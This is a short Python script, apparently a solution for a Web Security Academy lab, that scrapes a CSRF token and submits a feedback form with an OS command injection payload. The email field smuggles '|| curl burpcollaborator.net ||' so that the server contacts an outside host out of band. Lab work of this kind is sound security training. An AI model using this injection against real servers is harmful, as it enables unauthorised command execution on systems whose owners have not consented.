import requests
from bs4 import BeautifulSoup

if __name__ == "__main__":
    s = requests.Session()
    site = 'https://ac0b1f571ea8f46cc0d68aa7004b00d4.web-security-academy.net'
    feedback_url = f'{site}/feedback'
    resp = s.get(feedback_url)
    soup = BeautifulSoup(resp.text, 'html.parser')
    csrf = soup.find('input', {'name': 'csrf'}).get('value')

    feedback_submit_url = f'{site}/feedback/submit'
    post_data = {
        'csrf': csrf,
        'name': 'x',
        'email': 'x@x.com|| curl burpcollaborator.net ||',
        'subject': 'x',
        'message': 'x'
    }
    resp = s.post(feedback_submit_url, data=post_data)
    print(resp.text)
